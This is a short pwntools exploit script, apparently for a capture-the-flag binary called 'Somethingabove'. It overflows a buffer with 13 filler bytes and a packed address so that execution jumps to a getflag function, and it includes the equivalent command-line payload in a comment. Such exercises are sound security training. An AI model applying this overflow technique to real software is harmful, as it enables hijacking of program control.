from pwn import *

#./Somethingabove $(python -c 'print "A"*13+"\xd4\x84\x04\x08"')
def main():

	getflag_plt=0x080484D4
	padding="A"*13
	padding+=p32(getflag_plt)
	print padding.encode('hex')
	print padding
	f=open('x','w')
	f.write(padding)
	f.close()
	r=process(['./Somethingabove', padding])

	print r.recv(1024)
	raw_input("Exploit?")
	#r.interactive()

if __name__=="__main__":
	main()
	sys.exit(0)
